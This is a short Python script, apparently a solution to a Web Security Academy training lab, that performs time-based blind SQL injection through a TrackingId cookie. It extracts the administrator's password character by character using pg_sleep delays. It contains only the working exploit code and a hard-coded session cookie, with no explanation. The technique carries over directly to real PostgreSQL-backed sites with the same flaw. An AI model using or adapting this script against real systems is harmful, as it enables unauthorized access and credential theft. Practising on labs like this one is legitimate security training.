import requests

s = requests.Session()
abc = 'abcdefghijklmnopqrstuvwxyz0123456789'

password = ""
for p in range(20):
    for a in abc:
    # a = 'a'
    # p = 1
        r = s.get('https://ac121fdb1e353eb580993b7f00c900a8.web-security-academy.net/', cookies={"TrackingId":"TIM9NdKmwTUJUYxT'%3B SELECT CASE WHEN ('"+a+"'=SUBSTRING(password,"+str(p+1)+",1)) THEN pg_sleep(3) ELSE pg_sleep(0) END from users where username='administrator'--", "session":"0iw1Ot3SXZodtYvilWtYeuySiejt9iW6"})
        print("password =", password, "|", (p+1),r.elapsed.total_seconds(), a, end =" ")
        if r.elapsed.total_seconds() > 3 :
            print("[+]")
            password += a
            break
        else:
            print("[X]")
print (password)
